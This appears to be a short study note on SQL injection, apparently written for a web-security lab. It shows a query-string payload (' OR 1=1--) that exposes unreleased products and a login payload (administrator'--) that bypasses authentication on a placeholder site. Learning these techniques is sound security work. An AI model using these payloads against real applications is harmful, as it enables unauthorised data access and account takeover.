# Retrieving hidden data
In the url we see the behavior of the app
```
https://insecure-website.com/products?category=Gifts
```
In SQL Statement is:
```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
So we could try different payload like:
```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

# Subverting application logic
In the login flow, we can use this payload to login like administrator
```
administrator'--
```
